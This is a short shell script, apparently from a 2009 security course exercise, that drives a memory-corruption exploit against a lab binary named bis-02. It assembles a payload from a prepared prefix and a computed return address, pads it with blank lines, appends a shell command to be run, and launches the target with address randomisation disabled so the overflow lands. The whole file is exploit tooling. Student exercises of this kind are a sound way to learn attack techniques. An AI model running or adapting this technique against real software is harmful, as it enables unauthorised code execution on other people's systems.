#!/bin/sh
#
# Encoding: utf-8
# Author:   Petr Zemek, s3rvac@gmail.com
# Date:     2009-11-05
#
cp pre_payload.address4 pre_payload
gcc -o b b.c
./b
cat address >> pre_payload
(cat pre_payload ; yes '' | head -n 20000; echo 'echo "Petr Zemek"') > payload
exec -c ./setarch i386 -R ./bis-02 < ./payload
